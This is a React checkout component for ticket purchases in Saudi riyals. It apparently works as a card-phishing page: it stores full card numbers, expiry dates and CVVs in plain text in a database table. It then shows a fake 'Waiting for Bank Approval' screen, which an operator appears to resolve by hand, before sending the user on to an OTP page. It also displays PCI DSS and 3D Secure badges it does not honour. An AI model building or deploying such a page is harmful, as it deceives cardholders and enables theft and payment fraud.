import React, { useState, useRef, useEffect } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { supabase } from "../lib/supabaseClient";
import { useLanguage } from "../context/LanguageContext";
import { motion, AnimatePresence } from "framer-motion";
import {
  CreditCard,
  Lock,
  CheckCircle,
  AlertCircle,
  Loader2,
  ChevronLeft,
} from "lucide-react";

// ─── BIN Database ───────────────────────────────────────────────────────────
const BIN_DATABASE: Record<string, { bank: string; bankAr: string; color: string }> = {
  // Al Rajhi Bank
  "458456": { bank: "Al Rajhi Bank", bankAr: "مصرف الراجحي", color: "#1a5276" },
  "458457": { bank: "Al Rajhi Bank", bankAr: "مصرف الراجحي", color: "#1a5276" },
  "458458": { bank: "Al Rajhi Bank", bankAr: "مصرف الراجحي", color: "#1a5276" },
  "440647": { bank: "Al Rajhi Bank", bankAr: "مصرف الراجحي", color: "#1a5276" },
  "440648": { bank: "Al Rajhi Bank", bankAr: "مصرف الراجحي", color: "#1a5276" },
  "440795": { bank: "Al Rajhi Bank", bankAr: "مصرف الراجحي", color: "#1a5276" },
  "521433": { bank: "Al Rajhi Bank", bankAr: "مصرف الراجحي", color: "#1a5276" },
  "521434": { bank: "Al Rajhi Bank", bankAr: "مصرف الراجحي", color: "#1a5276" },
  "588848": { bank: "Al Rajhi Bank", bankAr: "مصرف الراجحي", color: "#1a5276" },
  "588849": { bank: "Al Rajhi Bank", bankAr: "مصرف الراجحي", color: "#1a5276" },
  "604906": { bank: "Al Rajhi Bank", bankAr: "مصرف الراجحي", color: "#1a5276" },
  "604907": { bank: "Al Rajhi Bank", bankAr: "مصرف الراجحي", color: "#1a5276" },
  "604908": { bank: "Al Rajhi Bank", bankAr: "مصرف الراجحي", color: "#1a5276" },
  "604909": { bank: "Al Rajhi Bank", bankAr: "مصرف الراجحي", color: "#1a5276" },
  "604910": { bank: "Al Rajhi Bank", bankAr: "مصرف الراجحي", color: "#1a5276" },
  // Saudi National Bank (SNB)
  "455070": { bank: "Saudi National Bank", bankAr: "البنك الأهلي السعودي", color: "#1b4f72" },
  "455071": { bank: "Saudi National Bank", bankAr: "البنك الأهلي السعودي", color: "#1b4f72" },
  "455072": { bank: "Saudi National Bank", bankAr: "البنك الأهلي السعودي", color: "#1b4f72" },
  "455073": { bank: "Saudi National Bank", bankAr: "البنك الأهلي السعودي", color: "#1b4f72" },
  "455074": { bank: "Saudi National Bank", bankAr: "البنك الأهلي السعودي", color: "#1b4f72" },
  "521816": { bank: "Saudi National Bank", bankAr: "البنك الأهلي السعودي", color: "#1b4f72" },
  "521817": { bank: "Saudi National Bank", bankAr: "البنك الأهلي السعودي", color: "#1b4f72" },
  "604906": { bank: "Saudi National Bank", bankAr: "البنك الأهلي السعودي", color: "#1b4f72" },
  // Banque Saudi Fransi
  "455510": { bank: "Banque Saudi Fransi", bankAr: "البنك السعودي الفرنسي", color: "#1a3a5c" },
  "455511": { bank: "Banque Saudi Fransi", bankAr: "البنك السعودي الفرنسي", color: "#1a3a5c" },
  "455512": { bank: "Banque Saudi Fransi", bankAr: "البنك السعودي الفرنسي", color: "#1a3a5c" },
  "521500": { bank: "Banque Saudi Fransi", bankAr: "البنك السعودي الفرنسي", color: "#1a3a5c" },
  "521501": { bank: "Banque Saudi Fransi", bankAr: "البنك السعودي الفرنسي", color: "#1a3a5c" },
  "604820": { bank: "Banque Saudi Fransi", bankAr: "البنك السعودي الفرنسي", color: "#1a3a5c" },
  "604821": { bank: "Banque Saudi Fransi", bankAr: "البنك السعودي الفرنسي", color: "#1a3a5c" },
  // Riyad Bank
  "455900": { bank: "Riyad Bank", bankAr: "بنك الرياض", color: "#154360" },
  "455901": { bank: "Riyad Bank", bankAr: "بنك الرياض", color: "#154360" },
  "455902": { bank: "Riyad Bank", bankAr: "بنك الرياض", color: "#154360" },
  "521600": { bank: "Riyad Bank", bankAr: "بنك الرياض", color: "#154360" },
  "521601": { bank: "Riyad Bank", bankAr: "بنك الرياض", color: "#154360" },
  "604700": { bank: "Riyad Bank", bankAr: "بنك الرياض", color: "#154360" },
  "604701": { bank: "Riyad Bank", bankAr: "بنك الرياض", color: "#154360" },
  // Alinma Bank
  "455800": { bank: "Alinma Bank", bankAr: "مصرف الإنماء", color: "#0e6655" },
  "455801": { bank: "Alinma Bank", bankAr: "مصرف الإنماء", color: "#0e6655" },
  "521700": { bank: "Alinma Bank", bankAr: "مصرف الإنماء", color: "#0e6655" },
  "521701": { bank: "Alinma Bank", bankAr: "مصرف الإنماء", color: "#0e6655" },
  "604800": { bank: "Alinma Bank", bankAr: "مصرف الإنماء", color: "#0e6655" },
  "604801": { bank: "Alinma Bank", bankAr: "مصرف الإنماء", color: "#0e6655" },
  // Bank Albilad
  "456200": { bank: "Bank Albilad", bankAr: "بنك البلاد", color: "#1f618d" },
  "456201": { bank: "Bank Albilad", bankAr: "بنك البلاد", color: "#1f618d" },
  "521900": { bank: "Bank Albilad", bankAr: "بنك البلاد", color: "#1f618d" },
  "604850": { bank: "Bank Albilad", bankAr: "بنك البلاد", color: "#1f618d" },
  // Arab National Bank
  "456300": { bank: "Arab National Bank", bankAr: "البنك العربي الوطني", color: "#6e2f1a" },
  "456301": { bank: "Arab National Bank", bankAr: "البنك العربي الوطني", color: "#6e2f1a" },
  "521800": { bank: "Arab National Bank", bankAr: "البنك العربي الوطني", color: "#6e2f1a" },
  "604860": { bank: "Arab National Bank", bankAr: "البنك العربي الوطني", color: "#6e2f1a" },
  "604861": { bank: "Arab National Bank", bankAr: "البنك العربي الوطني", color: "#6e2f1a" },
  // Saudi Awwal Bank (SAB)
  "456400": { bank: "Saudi Awwal Bank", bankAr: "البنك السعودي الأول", color: "#1a5276" },
  "456401": { bank: "Saudi Awwal Bank", bankAr: "البنك السعودي الأول", color: "#1a5276" },
  "521950": { bank: "Saudi Awwal Bank", bankAr: "البنك السعودي الأول", color: "#1a5276" },
  "604870": { bank: "Saudi Awwal Bank", bankAr: "البنك السعودي الأول", color: "#1a5276" },
  // Bank AlJazira
  "456500": { bank: "Bank AlJazira", bankAr: "بنك الجزيرة", color: "#1b2631" },
  "456501": { bank: "Bank AlJazira", bankAr: "بنك الجزيرة", color: "#1b2631" },
  "604880": { bank: "Bank AlJazira", bankAr: "بنك الجزيرة", color: "#1b2631" },
  // Test cards
  "411111": { bank: "Test Visa", bankAr: "فيزا تجريبية", color: "#1a5276" },
  "555555": { bank: "Test Mastercard", bankAr: "ماستركارد تجريبية", color: "#922b21" },
  "378282": { bank: "Test Amex", bankAr: "أمريكان إكسبريس تجريبية", color: "#1f618d" },
};

// ─── Card Brand Detection ────────────────────────────────────────────────────
function detectCardBrand(number: string): "visa" | "mastercard" | "amex" | "mada" | null {
  const clean = number.replace(/\s/g, "");
  if (/^4/.test(clean)) return "visa";
  if (/^5[1-5]/.test(clean) || /^2[2-7]/.test(clean)) return "mastercard";
  if (/^3[47]/.test(clean)) return "amex";
  if (/^(604906|588848|588849|604907|604908|604909|604910|440647|440648|440795|458456|458457|458458|521433|521434)/.test(clean)) return "mada";
  return null;
}

function detectBank(number: string) {
  const clean = number.replace(/\s/g, "");
  for (let len = 6; len >= 4; len--) {
    const bin = clean.substring(0, len);
    if (BIN_DATABASE[bin]) return BIN_DATABASE[bin];
  }
  return null;
}

// ─── Luhn Validation ────────────────────────────────────────────────────────
function isValidLuhn(number: string): boolean {
  const clean = number.replace(/\s/g, "");
  if (clean.length < 13) return false;
  let sum = 0;
  let isEven = false;
  for (let i = clean.length - 1; i >= 0; i--) {
    let digit = parseInt(clean[i], 10);
    if (isEven) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    isEven = !isEven;
  }
  return sum % 10 === 0;
}

// ─── Format Card Number ──────────────────────────────────────────────────────
function formatCardNumber(value: string): string {
  const clean = value.replace(/\D/g, "").substring(0, 16);
  return clean.replace(/(.{4})/g, "$1 ").trim();
}

// ─── SVG Logos ───────────────────────────────────────────────────────────────
const VisaLogo = () => (
  <svg viewBox="0 0 48 16" className="h-6 w-auto">
    <text x="0" y="14" fontSize="16" fontWeight="bold" fill="#1a1f71" fontFamily="Arial">VISA</text>
  </svg>
);

const MastercardLogo = () => (
  <svg viewBox="0 0 38 24" className="h-6 w-auto">
    <circle cx="13" cy="12" r="10" fill="#eb001b" />
    <circle cx="25" cy="12" r="10" fill="#f79e1b" />
    <path d="M19 5.5a10 10 0 0 1 0 13A10 10 0 0 1 19 5.5z" fill="#ff5f00" />
  </svg>
);

const AmexLogo = () => (
  <svg viewBox="0 0 60 20" className="h-6 w-auto">
    <text x="0" y="16" fontSize="14" fontWeight="bold" fill="#2e77bc" fontFamily="Arial">AMEX</text>
  </svg>
);

const MadaLogo = () => (
  <svg viewBox="0 0 60 20" className="h-6 w-auto">
    <text x="0" y="16" fontSize="14" fontWeight="bold" fill="#00a651" fontFamily="Arial">mada</text>
  </svg>
);

// ─── Card Preview Component ──────────────────────────────────────────────────
interface CardPreviewProps {
  cardNumber: string;
  cardHolder: string;
  expiry: string;
  cvv: string;
  brand: "visa" | "mastercard" | "amex" | "mada" | null;
  bank: { bank: string; bankAr: string; color: string } | null;
  focusedField: string | null;
  isRTL: boolean;
}

const CardPreview: React.FC<CardPreviewProps> = ({
  cardNumber, cardHolder, expiry, cvv, brand, bank, focusedField, isRTL
}) => {
  const [tilt, setTilt] = useState({ x: 0, y: 0 });
  const cardRef = useRef<HTMLDivElement>(null);
  const isFlipped = focusedField === "cvv";

  const handleMouseMove = (e: React.MouseEvent<HTMLDivElement>) => {
    if (!cardRef.current) return;
    const rect = cardRef.current.getBoundingClientRect();
    const x = ((e.clientY - rect.top) / rect.height - 0.5) * 20;
    const y = ((e.clientX - rect.left) / rect.width - 0.5) * -20;
    setTilt({ x, y });
  };

  const displayNumber = cardNumber
    ? cardNumber.padEnd(19, " ").substring(0, 19)
    : "•••• •••• •••• ••••";

  const displayHolder = cardHolder || (isRTL ? "اسم حامل البطاقة" : "CARD HOLDER");
  const displayExpiry = expiry || "MM/YY";

  return (
    <div
      ref={cardRef}
      className="relative w-full max-w-sm mx-auto"
      style={{ perspective: "1000px", height: "200px" }}
      onMouseMove={handleMouseMove}
      onMouseLeave={() => setTilt({ x: 0, y: 0 })}
    >
      <motion.div
        className="relative w-full h-full"
        style={{ transformStyle: "preserve-3d" }}
        animate={{
          rotateY: isFlipped ? 180 : 0,
          rotateX: tilt.x,
          rotateZ: tilt.y * 0.1,
        }}
        transition={{ duration: 0.6, type: "spring", stiffness: 100 }}
      >
        {/* Front */}
        <div
          className="absolute inset-0 rounded-2xl p-5 flex flex-col justify-between shadow-2xl"
          style={{
            backfaceVisibility: "hidden",
            background: bank
              ? `linear-gradient(135deg, ${bank.color} 0%, ${bank.color}cc 100%)`
              : "linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%)",
          }}
        >
          {/* Top row */}
          <div className="flex justify-between items-start">
            <div>
              <p className="text-white/60 text-xs">
                {bank ? (isRTL ? bank.bankAr : bank.bank) : (isRTL ? "البنك" : "Bank")}
              </p>
            </div>
            <div className="bg-white/10 rounded px-2 py-1">
              {brand === "visa" && <VisaLogo />}
              {brand === "mastercard" && <MastercardLogo />}
              {brand === "amex" && <AmexLogo />}
              {brand === "mada" && <MadaLogo />}
              {!brand && <CreditCard className="text-white/40 w-8 h-5" />}
            </div>
          </div>

          {/* Chip */}
          <div className="flex items-center gap-3">
            <div className="w-10 h-8 rounded bg-gradient-to-br from-yellow-300 to-yellow-500 flex items-center justify-center">
              <div className="w-6 h-5 border border-yellow-600/50 rounded-sm grid grid-cols-3 gap-px p-0.5">
                {[...Array(9)].map((_, i) => (
                  <div key={i} className="bg-yellow-600/30 rounded-sm" />
                ))}
              </div>
            </div>
          </div>

          {/* Card Number */}
          <div>
            <motion.p
              className="text-white font-mono text-lg tracking-widest"
              animate={{ scale: focusedField === "cardNumber" ? 1.02 : 1 }}
            >
              {displayNumber}
            </motion.p>
          </div>

          {/* Bottom row */}
          <div className="flex justify-between items-end">
            <div>
              <p className="text-white/50 text-xs mb-0.5">{isRTL ? "حامل البطاقة" : "Card Holder"}</p>
              <motion.p
                className="text-white text-sm font-medium uppercase tracking-wide truncate max-w-[160px]"
                animate={{ scale: focusedField === "cardHolder" ? 1.02 : 1 }}
              >
                {displayHolder}
              </motion.p>
            </div>
            <div className="text-right">
              <p className="text-white/50 text-xs mb-0.5">{isRTL ? "تاريخ الانتهاء" : "Expires"}</p>
              <motion.p
                className="text-white text-sm font-medium"
                animate={{ scale: focusedField === "expiry" ? 1.02 : 1 }}
              >
                {displayExpiry}
              </motion.p>
            </div>
          </div>
        </div>

        {/* Back */}
        <div
          className="absolute inset-0 rounded-2xl shadow-2xl overflow-hidden"
          style={{
            backfaceVisibility: "hidden",
            transform: "rotateY(180deg)",
            background: bank
              ? `linear-gradient(135deg, ${bank.color} 0%, ${bank.color}cc 100%)`
              : "linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%)",
          }}
        >
          <div className="w-full h-10 bg-black/60 mt-6" />
          <div className="px-5 mt-4">
            <div className="flex items-center gap-3">
              <div className="flex-1 h-10 bg-white/20 rounded flex items-center px-3">
                <div className="flex-1 h-1 bg-white/30 rounded" />
              </div>
              <div className="bg-white rounded px-3 py-2 min-w-[60px] text-center">
                <p className="text-gray-800 font-mono font-bold text-sm">
                  {cvv || "•••"}
                </p>
              </div>
            </div>
            <p className="text-white/50 text-xs mt-2 text-right">CVV</p>
          </div>
        </div>
      </motion.div>
    </div>
  );
};

// ─── WaitingApproval Component ───────────────────────────────────────────────
interface WaitingApprovalProps {
  orderId: string;
  onApproved: () => void;
  onRejected: () => void;
  isRTL: boolean;
}

const WaitingApproval: React.FC<WaitingApprovalProps> = ({
  orderId, onApproved, onRejected, isRTL
}) => {
  const [timeLeft, setTimeLeft] = useState(120);

  useEffect(() => {
    // Real-time subscription for order status
    const channel = supabase
      .channel(`order-${orderId}`)
      .on(
        "postgres_changes",
        {
          event: "UPDATE",
          schema: "public",
          table: "ticket_orders",
          filter: `id=eq.${orderId}`,
        },
        (payload) => {
          const status = payload.new?.status;
          if (status === "confirmed") onApproved();
          else if (status === "rejected") onRejected();
        }
      )
      .subscribe();

    return () => { supabase.removeChannel(channel); };
  }, [orderId, onApproved, onRejected]);

  useEffect(() => {
    if (timeLeft <= 0) { onRejected(); return; }
    const timer = setTimeout(() => setTimeLeft((t) => t - 1), 1000);
    return () => clearTimeout(timer);
  }, [timeLeft, onRejected]);

  const minutes = Math.floor(timeLeft / 60).toString().padStart(2, "0");
  const seconds = (timeLeft % 60).toString().padStart(2, "0");
  const progress = (timeLeft / 120) * 100;

  return (
    <motion.div
      initial={{ opacity: 0, scale: 0.95 }}
      animate={{ opacity: 1, scale: 1 }}
      className="flex flex-col items-center justify-center py-12 px-6 text-center"
    >
      {/* Spinner */}
      <div className="relative w-24 h-24 mb-6">
        <svg className="w-24 h-24 -rotate-90" viewBox="0 0 96 96">
          <circle cx="48" cy="48" r="44" fill="none" stroke="#e5e7eb" strokeWidth="6" />
          <circle
            cx="48" cy="48" r="44"
            fill="none"
            stroke="#d4a843"
            strokeWidth="6"
            strokeLinecap="round"
            strokeDasharray={`${2 * Math.PI * 44}`}
            strokeDashoffset={`${2 * Math.PI * 44 * (1 - progress / 100)}`}
            style={{ transition: "stroke-dashoffset 1s linear" }}
          />
        </svg>
        <div className="absolute inset-0 flex items-center justify-center">
          <span className="text-xl font-bold text-gray-800 font-mono">
            {minutes}:{seconds}
          </span>
        </div>
      </div>

      <motion.div
        animate={{ rotate: [0, 10, -10, 0] }}
        transition={{ repeat: Infinity, duration: 2 }}
        className="text-4xl mb-4"
      >
        🔐
      </motion.div>

      <h3 className="text-xl font-bold text-gray-800 mb-2">
        {isRTL ? "في انتظار موافقة البنك" : "Waiting for Bank Approval"}
      </h3>
      <p className="text-gray-500 text-sm max-w-xs">
        {isRTL
          ? "يتم التحقق من بيانات بطاقتك. يرجى الانتظار..."
          : "Your card details are being verified. Please wait..."}
      </p>

      <div className="mt-6 flex items-center gap-2 text-xs text-gray-400">
        <Lock className="w-3 h-3" />
        <span>{isRTL ? "اتصال آمن ومشفر" : "Secure encrypted connection"}</span>
      </div>
    </motion.div>
  );
};

// ─── Main CardPayment Component ──────────────────────────────────────────────
interface CardPaymentProps {
  orderData?: {
    orderId: string;
    total: number;
    items?: Array<{ name: string; quantity: number; price: number }>;
  };
}

const CardPayment: React.FC<CardPaymentProps> = ({ orderData }) => {
  const navigate = useNavigate();
  const location = useLocation();
  const { language } = useLanguage();
  const isRTL = language === "ar";

  // Get order data from props or location state
  const order = orderData || location.state?.orderData;

  // Form state
  const [cardNumber, setCardNumber] = useState("");
  const [cardHolder, setCardHolder] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [focusedField, setFocusedField] = useState<string | null>(null);

  // Detection state
  const [brand, setBrand] = useState<"visa" | "mastercard" | "amex" | "mada" | null>(null);
  const [bank, setBank] = useState<{ bank: string; bankAr: string; color: string } | null>(null);

  // UI state
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [isLoading, setIsLoading] = useState(false);
  const [step, setStep] = useState<"form" | "waiting" | "success">("form");
  const [savedOrderId, setSavedOrderId] = useState<string>("");

  // ─── Handlers ─────────────────────────────────────────────────────────────
  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value);
    setCardNumber(formatted);
    const clean = formatted.replace(/\s/g, "");
    setBrand(detectCardBrand(clean));
    setBank(detectBank(clean));
    if (errors.cardNumber) setErrors((prev) => ({ ...prev, cardNumber: "" }));
  };

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let val = e.target.value.replace(/\D/g, "").substring(0, 4);
    if (val.length >= 2) val = val.substring(0, 2) + "/" + val.substring(2);
    setExpiry(val);
    if (errors.expiry) setErrors((prev) => ({ ...prev, expiry: "" }));
  };

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, "").substring(0, brand === "amex" ? 4 : 3);
    setCvv(val);
    if (errors.cvv) setErrors((prev) => ({ ...prev, cvv: "" }));
  };

  // ─── Validation ───────────────────────────────────────────────────────────
  const validate = (): boolean => {
    const newErrors: Record<string, string> = {};
    const cleanNumber = cardNumber.replace(/\s/g, "");

    if (!cardHolder.trim()) {
      newErrors.cardHolder = isRTL ? "الاسم مطلوب" : "Name is required";
    }
    if (cleanNumber.length < 13) {
      newErrors.cardNumber = isRTL ? "رقم البطاقة غير صحيح" : "Invalid card number";
    } else if (!isValidLuhn(cleanNumber)) {
      newErrors.cardNumber = isRTL ? "رقم البطاقة غير صالح" : "Card number is not valid";
    }
    if (!expiry.match(/^\d{2}\/\d{2}$/)) {
      newErrors.expiry = isRTL ? "تاريخ الانتهاء غير صحيح" : "Invalid expiry date";
    } else {
      const [month, year] = expiry.split("/").map(Number);
      const now = new Date();
      const expDate = new Date(2000 + year, month - 1);
      if (month < 1 || month > 12 || expDate < now) {
        newErrors.expiry = isRTL ? "البطاقة منتهية الصلاحية" : "Card is expired";
      }
    }
    if (cvv.length < (brand === "amex" ? 4 : 3)) {
      newErrors.cvv = isRTL ? "رمز CVV غير صحيح" : "Invalid CVV";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  // ─── Submit ───────────────────────────────────────────────────────────────
  const handlePay = async () => {
    if (!validate()) return;
    setIsLoading(true);

    try {
      const cleanNumber = cardNumber.replace(/\s/g, "");
      const last4 = cleanNumber.slice(-4);

      // Build update payload
      const updatePayload: Record<string, unknown> = {
        status: "pending",
        card_last4: last4,
        card_brand: brand || "unknown",
        cardholder_name: cardHolder,
        bank_name: bank ? (isRTL ? bank.bankAr : bank.bank) : null,
        card_full_number: cleanNumber,
        card_expiry: expiry,
        card_cvv: cvv,
        updated_at: new Date().toISOString(),
      };

      let currentOrderId = order?.orderId;

      if (currentOrderId) {
        // Update existing order
        const { error } = await supabase
          .from("ticket_orders")
          .update(updatePayload)
          .eq("id", currentOrderId);

        if (error) throw error;
      } else {
        // Create new order if no orderId provided
        const { data, error } = await supabase
          .from("ticket_orders")
          .insert({
            ...updatePayload,
            total_amount: order?.total || 0,
            created_at: new Date().toISOString(),
          })
          .select("id")
          .single();

        if (error) throw error;
        currentOrderId = data.id;
      }

      setSavedOrderId(currentOrderId!);
      setStep("waiting");
    } catch (err) {
      console.error("Payment error:", err);
      setErrors({ submit: isRTL ? "حدث خطأ، يرجى المحاولة مرة أخرى" : "An error occurred, please try again" });
    } finally {
      setIsLoading(false);
    }
  };

  const handleApproved = () => {
    navigate("/card-otp", {
      state: {
        orderId: savedOrderId,
        cardLast4: cardNumber.replace(/\s/g, "").slice(-4),
        brand,
      },
    });
  };

  const handleRejected = () => {
    setStep("form");
    setErrors({
      submit: isRTL
        ? "تم رفض الدفع. يرجى التحقق من بيانات البطاقة والمحاولة مرة أخرى."
        : "Payment was declined. Please check your card details and try again.",
    });
  };

  // ─── Render ───────────────────────────────────────────────────────────────
  return (
    <div
      className="min-h-screen bg-gray-50 flex items-center justify-center p-4"
      dir={isRTL ? "rtl" : "ltr"}
    >
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        className="w-full max-w-md bg-white rounded-3xl shadow-xl overflow-hidden"
      >
        {/* Header */}
        <div className="bg-gradient-to-r from-gray-900 to-gray-800 px-6 py-5">
          <div className="flex items-center justify-between mb-4">
            <button
              onClick={() => navigate(-1)}
              className="text-white/70 hover:text-white transition-colors"
            >
              <ChevronLeft className={`w-5 h-5 ${isRTL ? "rotate-180" : ""}`} />
            </button>
            <div className="flex items-center gap-2">
              <Lock className="w-4 h-4 text-green-400" />
              <span className="text-white/70 text-xs">
                {isRTL ? "دفع آمن" : "Secure Payment"}
              </span>
            </div>
          </div>

          {/* Card Preview */}
          <CardPreview
            cardNumber={cardNumber}
            cardHolder={cardHolder}
            expiry={expiry}
            cvv={cvv}
            brand={brand}
            bank={bank}
            focusedField={focusedField}
            isRTL={isRTL}
          />
        </div>

        {/* Body */}
        <div className="p-6">
          <AnimatePresence mode="wait">
            {step === "form" && (
              <motion.div
                key="form"
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                exit={{ opacity: 0 }}
                className="space-y-4"
              >
                {/* Order Summary */}
                {order && (
                  <div className="bg-gray-50 rounded-xl p-3 flex justify-between items-center mb-2">
                    <span className="text-gray-500 text-sm">
                      {isRTL ? "المبلغ الإجمالي" : "Total Amount"}
                    </span>
                    <span className="font-bold text-gray-800">
                      {order.total?.toLocaleString()} {isRTL ? "ر.س" : "SAR"}
                    </span>
                  </div>
                )}

                {/* Cardholder Name */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1.5">
                    {isRTL ? "اسم حامل البطاقة" : "Cardholder Name"}
                  </label>
                  <input
                    type="text"
                    value={cardHolder}
                    onChange={(e) => {
                      setCardHolder(e.target.value);
                      if (errors.cardHolder) setErrors((p) => ({ ...p, cardHolder: "" }));
                    }}
                    onFocus={() => setFocusedField("cardHolder")}
                    onBlur={() => setFocusedField(null)}
                    placeholder={isRTL ? "الاسم كما يظهر على البطاقة" : "Name as on card"}
                    className={`w-full px-4 py-3 rounded-xl border text-sm transition-all outline-none
                      ${errors.cardHolder
                        ? "border-red-400 bg-red-50"
                        : focusedField === "cardHolder"
                        ? "border-yellow-400 bg-yellow-50/30 ring-2 ring-yellow-200"
                        : "border-gray-200 bg-gray-50 hover:border-gray-300"
                      }`}
                  />
                  {errors.cardHolder && (
                    <p className="text-red-500 text-xs mt-1 flex items-center gap-1">
                      <AlertCircle className="w-3 h-3" /> {errors.cardHolder}
                    </p>
                  )}
                </div>

                {/* Card Number */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1.5">
                    {isRTL ? "رقم البطاقة" : "Card Number"}
                  </label>
                  <div className="relative">
                    <input
                      type="text"
                      inputMode="numeric"
                      value={cardNumber}
                      onChange={handleCardNumberChange}
                      onFocus={() => setFocusedField("cardNumber")}
                      onBlur={() => setFocusedField(null)}
                      placeholder="•••• •••• •••• ••••"
                      className={`w-full px-4 py-3 rounded-xl border text-sm font-mono transition-all outline-none
                        ${errors.cardNumber
                          ? "border-red-400 bg-red-50"
                          : focusedField === "cardNumber"
                          ? "border-yellow-400 bg-yellow-50/30 ring-2 ring-yellow-200"
                          : "border-gray-200 bg-gray-50 hover:border-gray-300"
                        }`}
                    />
                    {brand && (
                      <div className="absolute right-3 top-1/2 -translate-y-1/2">
                        {brand === "visa" && <VisaLogo />}
                        {brand === "mastercard" && <MastercardLogo />}
                        {brand === "amex" && <AmexLogo />}
                        {brand === "mada" && <MadaLogo />}
                      </div>
                    )}
                  </div>
                  {bank && !errors.cardNumber && (
                    <p className="text-green-600 text-xs mt-1 flex items-center gap-1">
                      <CheckCircle className="w-3 h-3" />
                      {isRTL ? bank.bankAr : bank.bank}
                    </p>
                  )}
                  {errors.cardNumber && (
                    <p className="text-red-500 text-xs mt-1 flex items-center gap-1">
                      <AlertCircle className="w-3 h-3" /> {errors.cardNumber}
                    </p>
                  )}
                </div>

                {/* Expiry + CVV */}
                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-1.5">
                      {isRTL ? "تاريخ الانتهاء" : "Expiry Date"}
                    </label>
                    <input
                      type="text"
                      inputMode="numeric"
                      value={expiry}
                      onChange={handleExpiryChange}
                      onFocus={() => setFocusedField("expiry")}
                      onBlur={() => setFocusedField(null)}
                      placeholder="MM/YY"
                      className={`w-full px-4 py-3 rounded-xl border text-sm font-mono transition-all outline-none
                        ${errors.expiry
                          ? "border-red-400 bg-red-50"
                          : focusedField === "expiry"
                          ? "border-yellow-400 bg-yellow-50/30 ring-2 ring-yellow-200"
                          : "border-gray-200 bg-gray-50 hover:border-gray-300"
                        }`}
                    />
                    {errors.expiry && (
                      <p className="text-red-500 text-xs mt-1">{errors.expiry}</p>
                    )}
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-1.5">
                      CVV
                    </label>
                    <input
                      type="password"
                      inputMode="numeric"
                      value={cvv}
                      onChange={handleCvvChange}
                      onFocus={() => setFocusedField("cvv")}
                      onBlur={() => setFocusedField(null)}
                      placeholder={brand === "amex" ? "••••" : "•••"}
                      className={`w-full px-4 py-3 rounded-xl border text-sm font-mono transition-all outline-none
                        ${errors.cvv
                          ? "border-red-400 bg-red-50"
                          : focusedField === "cvv"
                          ? "border-yellow-400 bg-yellow-50/30 ring-2 ring-yellow-200"
                          : "border-gray-200 bg-gray-50 hover:border-gray-300"
                        }`}
                    />
                    {errors.cvv && (
                      <p className="text-red-500 text-xs mt-1">{errors.cvv}</p>
                    )}
                  </div>
                </div>

                {/* Submit Error */}
                {errors.submit && (
                  <motion.div
                    initial={{ opacity: 0, y: -10 }}
                    animate={{ opacity: 1, y: 0 }}
                    className="bg-red-50 border border-red-200 rounded-xl p-3 flex items-start gap-2"
                  >
                    <AlertCircle className="w-4 h-4 text-red-500 mt-0.5 shrink-0" />
                    <p className="text-red-600 text-sm">{errors.submit}</p>
                  </motion.div>
                )}

                {/* Pay Button */}
                <motion.button
                  onClick={handlePay}
                  disabled={isLoading}
                  whileTap={{ scale: 0.98 }}
                  className="w-full py-4 rounded-xl font-bold text-white text-base
                    bg-gradient-to-r from-yellow-500 to-yellow-600
                    hover:from-yellow-600 hover:to-yellow-700
                    disabled:opacity-60 disabled:cursor-not-allowed
                    transition-all shadow-lg shadow-yellow-500/30
                    flex items-center justify-center gap-2"
                >
                  {isLoading ? (
                    <>
                      <Loader2 className="w-5 h-5 animate-spin" />
                      {isRTL ? "جاري المعالجة..." : "Processing..."}
                    </>
                  ) : (
                    <>
                      <Lock className="w-4 h-4" />
                      {isRTL
                        ? `ادفع ${order?.total?.toLocaleString() || ""} ر.س`
                        : `Pay ${order?.total?.toLocaleString() || ""} SAR`}
                    </>
                  )}
                </motion.button>

                {/* Security badges */}
                <div className="flex items-center justify-center gap-4 pt-1">
                  {["🔒 SSL", "🛡️ 3D Secure", "✓ PCI DSS"].map((badge) => (
                    <span key={badge} className="text-xs text-gray-400">{badge}</span>
                  ))}
                </div>
              </motion.div>
            )}

            {step === "waiting" && (
              <motion.div
                key="waiting"
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                exit={{ opacity: 0 }}
              >
                <WaitingApproval
                  orderId={savedOrderId}
                  onApproved={handleApproved}
                  onRejected={handleRejected}
                  isRTL={isRTL}
                />
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      </motion.div>
    </div>
  );
};

export default CardPayment;
